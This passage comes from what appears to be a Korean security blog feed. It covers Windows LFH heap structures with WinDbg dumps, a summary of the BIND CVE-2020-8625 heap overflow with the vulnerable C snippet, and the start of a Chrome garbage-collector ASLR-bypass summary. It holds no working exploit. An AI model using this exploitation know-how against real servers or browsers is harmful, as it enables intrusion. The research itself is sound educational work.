src="/2021/02/28/l0ch/pwncoolsexy-part2/Untitled%2013.png" alt></p><pre><code class="hljs c">(SubSegmentCode ^ pLFHKey ^ &amp;_HEAP ^ (&amp;_HEAP_ENTRY &gt;&gt; <span class="hljs-number">4</span>)) &lt;&lt; <span class="hljs-number">0xc</span></code></pre><p>&#xC758; &#xACB0;&#xAD0F;&#xAC12;&#xC774; chunk &#xC8FC;&#xC18C;&#xB85C;&#xBD80;&#xD130;&#xC758; <code>_HEAP_USERDATA_HEADER</code> &#xC624;&#xD504;&#xC14B;&#xC73C;&#xB85C;, &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/02/28/l0ch/pwncoolsexy-part2/Untitled%2014.png" alt></p><ul><li>0x000 SubSegment : UserBlock&#xC758; SubSegment &#xC8FC;&#xC18C;&#xB97C; &#xAC00;&#xB9AC;&#xD0B4;</li><li>0x018 EncodedOffsets : chunk header&#xC758; &#xBB34;&#xACB0;&#xC131; &#xAC80;&#xC99D;&#xC5D0; &#xC0AC;&#xC6A9;&#xB428;</li><li>0x020 BusyBitmap : chunk&#xAC00; &#xC0AC;&#xC6A9; &#xC911;&#xC778;&#xC9C0;&#xB97C; &#xB098;&#xD0C0;&#xB0C4;</li></ul><h3 id="LFH-HEAP"><a href="#LFH-HEAP" class="headerlink" title="_LFH_HEAP"></a>_LFH_HEAP</h3><p>LFH chunk&#xB97C; &#xAD00;&#xB9AC;&#xD558;&#xAE30; &#xC704;&#xD574; &#xC0AC;&#xC6A9;&#xB418;&#xB294; &#xAD6C;&#xC870;&#xCCB4;&#xC774;&#xBA70; <code>_HEAP</code> &#xC758; <code>FrontEndHeap</code> &#xD544;&#xB4DC;&#xC5D0;&#xC11C; &#xCC38;&#xC870;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs text">0:001&gt; dt _LFH_HEAP 0x000001cd`c8f20000ntdll!_LFH_HEAP   +0x000 Lock             : _RTL_SRWLOCK   +0x008 SubSegmentZones  : _LIST_ENTRY [ 0x000001cd`c8fa30d0 - 0x000001cd`c8fa30d0 ]   +0x018 Heap             : 0x000001cd`c8f90000 Void   +0x020 NextSegmentInfoArrayAddress : 0x000001cd`c8f21140 Void   +0x028 FirstUncommittedAddress : 0x000001cd`c8f22000 Void   +0x030 ReservedAddressLimit : 0x000001cd`c8f3a000 Void   +0x038 SegmentCreate    : 7   +0x03c SegmentDelete    : 0   +0x040 MinimumCacheDepth : 0   +0x044 CacheShiftThreshold : 0   +0x048 SizeInCache      : 0   +0x050 RunInfo          : _HEAP_BUCKET_RUN_INFO   +0x060 UserBlockCache   : [12] _USER_MEMORY_CACHE_ENTRY   +0x2a0 MemoryPolicies   : _HEAP_LFH_MEM_POLICIES   +0x2a4 Buckets          : [129] _HEAP_BUCKET   +0x4a8 SegmentInfoArrays : [129] (null)    +0x8b0 AffinitizedInfoArrays : [129] (null)    +0xcb8 SegmentAllocator : (null)    +0xcc0 LocalData        : [1] _HEAP_LOCAL_DATA</code></pre><ul><li>0x018 Heap : &#xD604;&#xC7AC; _LFH_HEAP &#xCC38;&#xC870;&#xD558;&#xB294; _HEAP &#xAD6C;&#xC870;&#xCCB4;&#xC758; &#xC2DC;&#xC791;&#xC744; &#xAC00;&#xB9AC;&#xD0B4;</li><li>0x2a4 Buckets : &#xD560;&#xB2F9; &#xC694;&#xCCAD;&#xB41C; chunk &#xD06C;&#xAE30;&#xC640; &#xC77C;&#xCE58;&#xD558;&#xB294; &#xBA54;&#xBAA8;&#xB9AC; &#xC601;&#xC5ED; &#xBC30;&#xC5F4;</li><li><p>0x4a8 SegmentInfoArrays : <code>_HEAP_LOCAL_SEGMENT_INFO</code> &#xAD6C;&#xC870;&#xCCB4; &#xBC30;&#xC5F4;&#xC744; &#xAC00;&#xB9AC;&#xD0A4;&#xBA70; chunk&#xB97C; &#xD06C;&#xAE30;&#xBCC4;&#xB85C; &#xAC01;&#xAC01;&#xC758; SubSegment&#xB85C; &#xAD00;&#xB9AC;&#xD558;&#xAE30; &#xC704;&#xD574; &#xC0AC;&#xC6A9;&#xB428;</p>  <pre><code class="hljs text">0:001&gt; dx -r1 (*((ntdll!_HEAP_LOCAL_SEGMENT_INFO * (*)[129])0x1cdc8f204a8))(*((ntdll!_HEAP_LOCAL_SEGMENT_INFO * (*)[129])0x1cdc8f204a8))                 [Type: _HEAP_LOCAL_SEGMENT_INFO * [129]]    [0]              : 0x0 [Type: _HEAP_LOCAL_SEGMENT_INFO *]    [1]              : 0x0 [Type: _HEAP_LOCAL_SEGMENT_INFO *]    [2]              : 0x1cdc8f20e40 [Type: _HEAP_LOCAL_SEGMENT_INFO *]    [3]              : 0x1cdc8f20f00 [Type: _HEAP_LOCAL_SEGMENT_INFO *]    [4]              : 0x1cdc8f20fc0 [Type: _HEAP_LOCAL_SEGMENT_INFO *]    [5]              : 0x1cdc8f21080 [Type: _HEAP_LOCAL_SEGMENT_INFO *]    [6]              : 0x0 [Type: _HEAP_LOCAL_SEGMENT_INFO *]...</code></pre></li><li><p>0xcc0 LocalData : _HEAP_LOCAL_DATA&#xB97C; &#xAC00;&#xB9AC;&#xD0A4;&#xBA70; LFH&#xC758; &#xC8FC;&#xC18C;&#xB97C; &#xAC80;&#xC0C9;&#xD558;&#xB294; &#xB370; &#xC0AC;&#xC6A9;&#xB428;</p></li></ul><h3 id="HEAP-BUCKET"><a href="#HEAP-BUCKET" class="headerlink" title="_HEAP_BUCKET"></a>_HEAP_BUCKET</h3><p>LFH&#xAC00; chunk&#xB97C; &#xD560;&#xB2F9;&#xD560; &#xB54C; &#xCC38;&#xC870;&#xD558;&#xBA70; Bucket&#xC744; &#xAD00;&#xB9AC;&#xD558;&#xAE30; &#xC704;&#xD574; &#xC0AC;&#xC6A9;&#xB429;&#xB2C8;&#xB2E4;. <code>_LFH_HEAP</code>&#xC758; Buckets &#xD544;&#xB4DC;&#xC5D0;&#xC11C; &#xCC38;&#xC870;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs text">0:001&gt; dt _HEAP_BUCKET 0x1cdc8f202a4ntdll!_HEAP_BUCKET   +0x000 BlockUnits       : 1   +0x002 SizeIndex        : 0 &apos;&apos;   +0x003 UseAffinity      : 0y0   +0x003 DebugFlags       : 0y00   +0x003 Flags            : 0 &apos;&apos;</code></pre><ul><li>0x000 BlockUnits : Bucket&#xC774; &#xAC00;&#xB9AC;&#xD0A4;&#xB294; chunk&#xC758; &#xD06C;&#xAE30; &gt;&gt; 4</li><li>0x002 SizeIndex : &#xD574;&#xB2F9; Bucket&#xC758; index&#xAC12;. <code>_LFH_HEAP</code>&#xC758; <code>SegmentInfoArrays</code> &#xBC30;&#xC5F4;&#xC758; index &#xAC12;&#xC73C;&#xB85C;&#xB3C4; &#xC0AC;&#xC6A9;&#xB428;</li></ul><h3 id="HEAP-LOCAL-SEGMENT-INFO"><a href="#HEAP-LOCAL-SEGMENT-INFO" class="headerlink" title="_HEAP_LOCAL_SEGMENT_INFO"></a>_HEAP_LOCAL_SEGMENT_INFO</h3><p>SubSegment&#xB97C; &#xAD00;&#xB9AC;&#xD558;&#xB294; &#xAD6C;&#xC870;&#xCCB4;&#xC774;&#xBA70; <code>_LFH_HEAP</code> &#xC758; <code>SegmentInfoArrays</code> &#xD544;&#xB4DC;&#xC5D0;&#xC11C; &#xCC38;&#xC870;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs text">0:001&gt; dx -r1 ((ntdll!_HEAP_LOCAL_SEGMENT_INFO *)0x1cdc8f20e40)((ntdll!_HEAP_LOCAL_SEGMENT_INFO *)0x1cdc8f20e40)                 : 0x1cdc8f20e40 [Type: _HEAP_LOCAL_SEGMENT_INFO *]    [+0x000] LocalData        : 0x1cdc8f20cc0 [Type: _HEAP_LOCAL_DATA *]    [+0x008] ActiveSubsegment : 0x1cdc8fa3170 [Type: _HEAP_SUBSEGMENT *]    [+0x010] CachedItems      [Type: _HEAP_SUBSEGMENT * [16]]    [+0x090] SListHeader      [Type: _SLIST_HEADER]    [+0x0a0] Counters         [Type: _HEAP_BUCKET_COUNTERS]    [+0x0a8] LastOpSequence   : 0x3 [Type: unsigned long]    [+0x0ac] BucketIndex      : 0x2 [Type: unsigned short]    [+0x0ae] LastUsed         : 0x0 [Type: unsigned short]    [+0x0b0] NoThrashCount    : 0x0 [Type: unsigned short]</code></pre><h3 id="HEAP-SUBSEGMENT"><a href="#HEAP-SUBSEGMENT" class="headerlink" title="_HEAP_SUBSEGMENT"></a>_HEAP_SUBSEGMENT</h3><p>LFH&#xB85C; &#xD560;&#xB2F9;&#xD55C; chunk&#xB4E4;&#xC744; &#xD06C;&#xAE30;&#xBCC4;&#xB85C; &#xAD00;&#xB9AC;&#xD560; &#xB54C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xAD6C;&#xC870;&#xCCB4;&#xC785;&#xB2C8;&#xB2E4;. <code>_HEAP_LOCAL_SEGMENT_INFO</code>&#xC758; <code>ActiveSubsegment</code> &#xD544;&#xB4DC;&#xC640; <code>Cacheditems</code> &#xD544;&#xB4DC;&#xC5D0;&#xC11C; &#xCC38;&#xC870;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs text">0:001&gt; dx -r1 ((ntdll!_HEAP_SUBSEGMENT *)0x1cdc8fa3170)((ntdll!_HEAP_SUBSEGMENT *)0x1cdc8fa3170)                 : 0x1cdc8fa3170 [Type: _HEAP_SUBSEGMENT *]    [+0x000] LocalInfo        : 0x1cdc8f20e40 [Type: _HEAP_LOCAL_SEGMENT_INFO *]    [+0x008] UserBlocks       : 0x1cdc8fa74e0 [Type: _HEAP_USERDATA_HEADER *]    [+0x010] DelayFreeList    [Type: _SLIST_HEADER]    [+0x020] AggregateExchg   [Type: _INTERLOCK_SEQ]    [+0x024] BlockSize        : 0x3 [Type: unsigned short]    [+0x026] Flags            : 0x0 [Type: unsigned short]    [+0x028] BlockCount       : 0x13 [Type: unsigned short]    [+0x02a] SizeIndex        : 0x2 [Type: unsigned char]    [+0x02b] AffinityIndex    : 0x0 [Type: unsigned char]    [+0x024] Alignment        [Type: unsigned long [2]]    [+0x02c] Lock             : 0x7 [Type: unsigned long]    [+0x030] SFreeListEntry   [Type: _SINGLE_LIST_ENTRY]0:001&gt; dx -r1 (*((ntdll!_HEAP_SUBSEGMENT * (*)[16])0x1cdc8f20e50))(*((ntdll!_HEAP_SUBSEGMENT * (*)[16])0x1cdc8f20e50))                 [Type: _HEAP_SUBSEGMENT * [16]]    [0]              : 0x0 [Type: _HEAP_SUBSEGMENT *]    [1]              : 0x0 [Type: _HEAP_SUBSEGMENT *]    [2]              : 0x0 [Type: _HEAP_SUBSEGMENT *]    [3]              : 0x0 [Type: _HEAP_SUBSEGMENT *]    [4]              : 0x0 [Type: _HEAP_SUBSEGMENT *]    [5]              : 0x0 [Type: _HEAP_SUBSEGMENT *]    [6]              : 0x0 [Type: _HEAP_SUBSEGMENT *]...</code></pre><ul><li>0x000 LocalInfo : &#xD604;&#xC7AC; SubSegment&#xC758; <code>_HEAP_LOCAL_SEGMENT_INFO</code> &#xB97C; &#xAC00;&#xB9AC;&#xD0B4;</li><li>0x008 UserBlock : &#xD604;&#xC7AC; SubSegment&#xC758; UserBlock(<code>_HEAP_USERDATA_HEADER</code>)&#xB97C; &#xAC00;&#xB9AC;&#xD0B4;</li><li>0x020 AggregateExchg : <code>_INTERLOCK_SEQ</code> &#xAD6C;&#xC870;&#xCCB4;&#xB97C; &#xCC38;&#xC870;&#xD558;&#xBA70; UserBlock&#xC758; &#xD574;&#xC81C;&#xB41C; chunk &#xAC1C;&#xC218;&#xB97C; &#xB098;&#xD0C0;&#xB0C4;. LFH&#xB294; &#xC774;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; Userblock&#xC5D0;&#xC11C; &#xD560;&#xB2F9;&#xD574;&#xC57C; &#xD558;&#xB294;&#xC9C0; &#xACB0;&#xC815;&#xD568;</li><li>0x024 BlockSize : UserBlock&#xC758; &#xAC01; chunk &#xD06C;&#xAE30; &gt;&gt; 4</li><li>0x028 BlockCount : UserBlock&#xC5D0; &#xD560;&#xB2F9;&#xB41C; chunk&#xC758; &#xAC1C;&#xC218;</li><li>0x02a SizeIndex : UserBlock&#xC5D0; &#xD574;&#xB2F9;&#xD558;&#xB294; SizeIndex(<code>_HEAP_LOCAL_SEGMENT_INFO</code>&#xC758; <code>BucketIndex</code>&#xC640; &#xAC19;&#xC740; &#xAC12;)</li></ul><h3 id="INTERLOCK-SEQ"><a href="#INTERLOCK-SEQ" class="headerlink" title="_INTERLOCK_SEQ"></a>_INTERLOCK_SEQ</h3><p>&#xD560;&#xB2F9;, &#xD574;&#xC81C;&#xB41C; chunk&#xC758; &#xAC1C;&#xC218;&#xB97C; &#xAD6C;&#xD560; &#xB54C; &#xCC38;&#xC870;&#xD558;&#xB294; &#xAD6C;&#xC870;&#xCCB4;&#xC785;&#xB2C8;&#xB2E4;. <code>_HEAP_SUBSEGMENT</code>&#xC758; <code>AggregateExchg</code> &#xD544;&#xB4DC;&#xC5D0;&#xC11C;  &#xCC38;&#xC870;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs text">0:001&gt; dx -r1 (*((ntdll!_INTERLOCK_SEQ *)0x1cdc8fa3190))(*((ntdll!_INTERLOCK_SEQ *)0x1cdc8fa3190))                 [Type: _INTERLOCK_SEQ]    [+0x000] Depth            : 0x7 [Type: unsigned short]    [+0x002 (14: 0)] Hint     : 0x2 [Type: unsigned short]    [+0x002 (15:15)] Lock     : 0x0 [Type: unsigned short]    [+0x002] Hint16           : 0x2 [Type: unsigned short]    [+0x000] Exchg            : 131079 [Type: long]</code></pre><ul><li>0x000 Depth : UserBlock&#xC5D0; &#xB0A8;&#xC544;&#xC788;&#xB294; &#xD574;&#xC81C; &#xB41C; &#xCCAD;&#xD06C; &#xAC1C;&#xC218;</li></ul><p>&#xB124; &#xC774;&#xBC88; &#xAE00;&#xC740; &#xC5EC;&#xAE30;&#xC11C; &#xB05D;&#xC785;&#xB2C8;&#xB2E4;. &#xBB54;&#xAC00; &#xB9C8;&#xBB34;&#xB9AC;&#xAC00; &#xCC1D;&#xCC1D;&#xD55C; &#xAC83; &#xAC19;&#xC8E0;..? &#xC0DD;&#xAC01;&#xB3C4; &#xBABB;&#xD55C; &#xAD6C;&#xC870;&#xCCB4; &#xAC1C;&#xC218;&#xB85C; &#xC774;&#xBC88;&#xC5D0;&#xB3C4; &#xC5ED;&#xC2DC;&#xB098; &#xBD84;&#xB7C9;&#xC870;&#xC808;&#xC5D0; &#xC2E4;&#xD328;&#xD574;&#xBC84;&#xB838;.. &#x314E;&#x314E;;  </p><p><img src="/2021/02/28/l0ch/pwncoolsexy-part2/Untitled%2015.jpg" alt></p><p>NT Heap&#xC758; &#xC790;&#xC138;&#xD55C; memory allocate process&#xB294; &#xB2E4;&#xC74C; &#xAE00;&#xC5D0;&#xC11C; &#xC18C;&#xAC1C;&#xD560; &#xC608;&#xC815;&#xC774;&#xBA70; &#xD3F0;&#xCFE8;&#xC139;&#xC2DC; &#xC2DC;&#xB9AC;&#xC988;&#xB294; &#xB2E4;&#xC74C; &#xAE00;&#xB85C; &#xB3CC;&#xC544;&#xC624;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;!</p><blockquote><p>P.S : &#xC544; &#xADF8;&#xB9AC;&#xACE0; &#xC774;&#xAC74; &#xBAB0;&#xB798; &#xB9D0;&#xC500;&#xB4DC;&#xB9AC;&#xB294; &#xAC74;&#xB370;(&#xC18D;&#xB2E5;) &#xACE7; &#xD2B9;&#xBCC4;&#xD55C; &#xAC8C;&#xC2DC;&#xAE00;&#xC774; &#xC62C;&#xB77C;&#xC62C; &#xC608;&#xC815;&#xC774;&#xB2C8;(&#xC18D;&#xB2E5;) &#xAE30;&#xB300;&#xD574;&#xC8FC;&#xC138;&#xC694;!</p></blockquote><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://www.slideshare.net/AngelBoy1/windows-10-nt-heap-exploitation-english-version">https://www.slideshare.net/AngelBoy1/windows-10-nt-heap-exploitation-english-version</a></p><p><a href="https://null2root.github.io/blog/2020/02/07/LazyFragmentationHeap-WCTF2019-writeup.html">https://null2root.github.io/blog/2020/02/07/LazyFragmentationHeap-WCTF2019-writeup.html</a></p><p><a href="https://blog.rapid7.com/2019/06/12/heap-overflow-exploitation-on-windows-10-explained/?fbclid=IwAR0RI5JuJ7gdFsA_Twju0tW2IdwPUFNppmUcyu7dz_wuqeR3Lq3lWUa8q8U">https://blog.rapid7.com/2019/06/12/heap-overflow-exploitation-on-windows-10-explained/?fbclid=IwAR0RI5JuJ7gdFsA_Twju0tW2IdwPUFNppmUcyu7dz_wuqeR3Lq3lWUa8q8U</a></p>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows</tag>
      
      <tag>heap</tag>
      
      <tag>L0ch</tag>
      
      <tag>research</tag>
      
      <tag>lfh</tag>
      
      <tag>nt heap</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-8625: Fifteen-year-old RCE bug</title>
    <link href="/2021/02/27/fabu1ous/2021-02-27/"/>
    <url>/2021/02/27/fabu1ous/2021-02-27/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a><strong>URL</strong></h2><p><a href="https://www.thezdi.com/blog/2021/2/24/cve-2020-8625-a-fifteen-year-old-rce-bug-returns-in-isc-bind-server">CVE-2020-8625: A FIFTEEN-YEAR-OLD RCE BUG RETURNS IN ISC BIND SERVER</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>BIND version 9.11 ~ 9.16</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>15&#xB144; &#xC804; ISC BIND &#xC11C;&#xBC84;&#xC5D0;&#xC11C; 4-byte &#xD799; &#xC624;&#xBC84;&#xD50C;&#xB85C;&#xC6B0;&#xB97C; &#xC545;&#xC6A9;&#xD55C; RCE &#xCDE8;&#xC57D;&#xC810;(CVE-2006-5989)&#xC774; &#xBC1C;&#xACAC;&#xB410;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC5D0; &#xB300;&#xD55C; &#xD328;&#xCE58;&#xAC00; merge &#xB418;&#xC9C0; &#xC54A;&#xC544; &#xBC29;&#xCE58;&#xB410;&#xACE0;, &#xC791;&#xB144;(2020&#xB144;)&#xC5D0; CVE-2020-8625&#xB77C;&#xB294; &#xBC88;&#xD638;&#xB85C; &#xD328;&#xCE58;&#xB410;&#xC2B5;&#xB2C8;&#xB2E4;. </p><pre><code class="hljs c"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> der_get_oid(<span class="hljs-keyword">const</span> <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> *p, <span class="hljs-keyword">size_t</span> len, oid *data, <span class="hljs-keyword">size_t</span> *size) { <span class="hljs-comment">// ... </span>data-&gt;components = <span class="hljs-built_in">malloc</span>(len * <span class="hljs-keyword">sizeof</span>(*data-&gt;components));   <span class="hljs-comment">// &lt;-- (1) </span>    <span class="hljs-keyword">if</span> (data-&gt;components == <span class="hljs-literal">NULL</span>) {       <span class="hljs-keyword">return</span> (ENOMEM);     }     data-&gt;components[<span class="hljs-number">0</span>] = (*p) / <span class="hljs-number">40</span>;    <span class="hljs-comment">// &lt;-- (2) </span>    data-&gt;components[<span class="hljs-number">1</span>] = (*p) % <span class="hljs-number">40</span>;     --len;               <span class="hljs-comment">// &lt;-- (3) </span>    ++p;     <span class="hljs-keyword">for</span> (n = <span class="hljs-number">2</span>; len &gt; <span class="hljs-number">0U</span>; ++n) {         <span class="hljs-keyword">unsigned</span> u = <span class="hljs-number">0</span>;          <span class="hljs-keyword">do</span> {             --len;             u = u * <span class="hljs-number">128</span> + (*p++ % <span class="hljs-number">128</span>);         } <span class="hljs-keyword">while</span> (len &gt; <span class="hljs-number">0U</span> &amp;&amp; p[<span class="hljs-number">-1</span>] &amp; <span class="hljs-number">0x80</span>);         data-&gt;components[n] = u;      <span class="hljs-comment">// &lt;-- (4) </span>    } <span class="hljs-comment">// ... </span>}</code></pre><p>&#xD799; &#xC624;&#xBC84;&#xD50C;&#xB85C;&#xC6B0; &#xBC84;&#xADF8;&#xAC00; &#xC874;&#xC7AC;&#xD558;&#xB294; lib/dns/spnego.c&#xC758; &#xD568;&#xC218; <code>der_get_old()</code> &#xC77C;&#xBD80;&#xC785;&#xB2C8;&#xB2E4;. </p><p>(1): &#xBC30;&#xC5F4;&#xD615; &#xBC84;&#xD37C;&#xB97C; &#xD560;&#xB2F9;&#xD558;&#xACE0; len &#xBCC0;&#xC218;&#xB97C; &#xD1B5;&#xD574; &#xBC84;&#xD37C;&#xC5D0; &#xB0A8;&#xC544;&#xC788;&#xB294; element &#xC218;&#xB97C; &#xCD94;&#xC801;&#xD569;&#xB2C8;&#xB2E4;.</p><p>(2): &#xBC84;&#xD37C;&#xC5D0; 2&#xAC1C;&#xC758; element&#xB97C; &#xB2F4;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p>(3): len&#xC758; &#xAC12;&#xC744; 1&#xBC88;&#xB9CC; &#xAC10;&#xC18C;&#xC2DC;&#xD0B5;&#xB2C8;&#xB2E4;.</p><p>(4): &#xD55C; &#xAC1C;&#xC758; int element(4 byte) &#xB9CC;&#xD07C; &#xC624;&#xBC84;&#xD50C;&#xB85C;&#xC6B0;&#xAC00; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xD574;&#xCEE4;&#xB294; &#xC11C;&#xBC84;&#xB85C; &#xC870;&#xC791;&#xB41C; request&#xB97C; &#xBCF4;&#xB0B4; <code>der_get_old()</code>&#xAC00; &#xD560;&#xB2F9;&#xD558;&#xB294; &#xBC84;&#xD37C;&#xC758; &#xD06C;&#xAE30;&#xC640; &#xADF8; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC870;&#xC791;&#xD560; &#xC218; &#xC788;&#xACE0;, <code>der_get_old()</code>&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xB294; loop count&#xB97C; &#xC870;&#xC791;&#xD560; &#xC218; &#xC788;&#xC73C;&#xBBC0;&#xB85C; &#xC5F0;&#xC18D;&#xB41C; &#xD799; &#xCCAD;&#xD06C;&#xC758; &#xC7AC;&#xD560;&#xB2F9;&#xC744; &#xC720;&#xB3C4;&#xD574; exploit&#xC744; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>rce</tag>
      
      <tag>heap</tag>
      
      <tag>overflow</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] 패치하지 않겠다고 밝힌 Chrome의 garbage collector를 통한 ASLR bypass 취약점</title>
    <link href="/2021/02/26/l0ch/2021-02-26/"/>
    <url>/2021/02/26/l0ch/2021-02-26/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=1144662">Bypassing ASLR using Oilpan&#x2019;s conservative garbage collector</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Google Chrome</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Google&#xC758; &#xC624;&#xD508;&#xC18C;&#xC2A4; &#xBE0C;&#xB77C;&#xC6B0;&#xC800;&#xC778; Chrome&#xC5D0;&#xC11C; ASLR&#xC744; &#xC6B0;&#xD68C;&#xD574; &#xB9E4;&#xD551;&#xB41C; &#xBA54;&#xBAA8;&#xB9AC; &#xC815;&#xBCF4;&#xB97C; &#xC720;&#xCD9C;&#xD560; &#xC218; &#xC788;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xC758; &#xC815;&#xBCF4;&#xC640; PoC&#xAC00; &#xACF5;&#xAC1C;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>Chrome&#xC758; V8 &#xC5D4;&#xC9C4;&#xC740; Oilpan garbage collector&#xB97C; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;. Oilpan garbage collector&#xB294; &#xC218;&#xC9D1;&#xD560; &#xD3EC;&#xC778;&#xD130;&#xB97C; &#xCC3E;&#xAE30; &#xC704;&#xD574; &#xC2A4;&#xD0DD;&#xC744; &#xC2A4;&#xCE94;&#xD558;&#xB294;&#xB370;, &#xC815;&#xC218;&#xC640; &#xD3EC;&#xC778;&#xD130;&#xC758; &#xD615;&#xC2DD;&#xC744; &#xAD6C;&#xBD84;&#xD558;&#xC9C0; &#xC54A;&#xC544; &#xC815;&#xC218;&#xAC00; &#xD560;&#xB2F9;&#xB41C; &#xAC1D;&#xCCB4; &#xB610;&#xD55C; &#xD3EC;&#xC778;&#xD130;&#xB85C; &#xAC00;&#xC815;&#xD574; &#xCC98;&#xB9AC;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB97C; &#xC774;&#xC6A9;&#xD558;&#xBA74; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC774; &#xC784;&#xC758;&#xC758; &#xC8FC;&#xC18C;&#xC5D0; &#xC5B4;&#xB5A4; &#xAC1D;&#xCCB4;&#xAC00; &#xC874;&#xC7AC;&#xD558;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li>&#xAC1D;&#xCCB4;&#xB97C; &#xD560;&#xB2F9;&#xD569;&#xB2C8;&#xB2E4;.</li><li>&#xC784;&#xC758;&#xC758; &#xC8FC;&#xC18C; &#xAC12; &#xC815;&#xC218;&#xB97C; &#xC2A4;&#xD0DD;&#xC5D0; &#xB123;&#xC2B5;&#xB2C8;&#xB2E4;.<ul><li>&#xC774;&#xB54C; &#xCDA9;&#xBD84;&#xD55C; &#xC218;&#xC758; &#xB9E4;&#xAC1C;&#xBCC0;&#xC218;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xBA74; &#xB9E4;&#xAC1C; &#xBCC0;&#xC218;&#xC6A9;&#xC73C;&#xB85C; &#xC608;&#xC57D;&#xB41C; &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xB97C; &#xBAA8;&#xB450; &#xC0AC;&#xC6A9;&#xD55C; &#xB4A4; garbage collector&#xAC00; &#xC2A4;&#xCE94;&#xD558;&#xB294; &#xC2A4;&#xD0DD;&#xC5D0; &#xB098;&#xBA38;&#xC9C0; &#xB9E4;&#xAC1C; &#xBCC0;&#xC218;&#xAC00; &#xC800;&#xC7A5;&#xB418;&#xC5B4; &#xC784;&#xC758;&#xC758; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC4F8; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</li></ul></li><li>&#xAC1D;&#xCCB4;&#xC5D0; &#xB300;&#xD55C; &#xBAA8;&#xB4E0; &#xCC38;&#xC870;&#xB97C; &#xC81C;&#xAC70;&#xD558;&#xACE0; garbage collection&#xC744; &#xD2B8;&#xB9AC;&#xAC70;&#xD569;&#xB2C8;&#xB2E4;.</li><li>&#xAC1D;&#xCCB4;&#xAC00; &#xD65C;&#xC131;&#xD654;&#xB41C; &#xC0C1;&#xD0DC;&#xBA74; &#xC784;&#xC758;&#xC758; &#xC8FC;&#xC18C;&#xAC00; &#xB300;&#xC0C1; &#xAC1D;&#xCCB4;&#xB97C; &#xAC00;&#xB9AC;&#xD0B4;&#xC744; &#xC758;&#xBBF8;&#xD569;&#xB2C8;&#xB2E4;.<ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/FinalizationRegistry">FinalizationRegistry</a> &#xB97C; &#xC0AC;&#xC6A9;&#xD574; &#xAC1D;&#xCCB4;&#xAC00; garbage collector&#xC5D0; &#xC758;&#xD574; &#xC218;&#xC9D1;&#xB420; &#xB54C; &#xD638;&#xCD9C;&#xB418;&#xB294; &#xAC1D;&#xCCB4;&#xC5D0; &#xB300;&#xD55C; &#xCF5C;&#xBC31;&#xC744; &#xC9C0;&#xC815;&#xD558;&#xBA74; &#xAC1D;&#xCCB4;&#xAC00; garbage collection&#xC774; &#xD2B8;&#xB9AC;&#xAC70; &#xB41C; &#xC774;&#xD6C4; &#xD65C;&#xC131;&#xD654;&#xB41C; &#xC0C1;&#xD0DC;&#xC778;&#xC9C0;&#xB97C; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</li></ul></li></ol><p>&#xACF5;&#xAC1C;&#xB41C; macOS &#xBC84;&#xC804;&#xC758; PoC&#xB97C; &#xC2E4;&#xD589;&#xD55C; &#xACB0;&#xACFC;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC73C;&#xBA70; Windows, Linux &#xB4F1; &#xB2E4;&#xB978; &#xD50C;&#xB7AB;&#xD3FC;&#xC758; Chrome&#xC5D0;&#xC11C;&#xB3C4; &#xB3D9;&#xC77C;&#xD55C; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;.</p><p><img 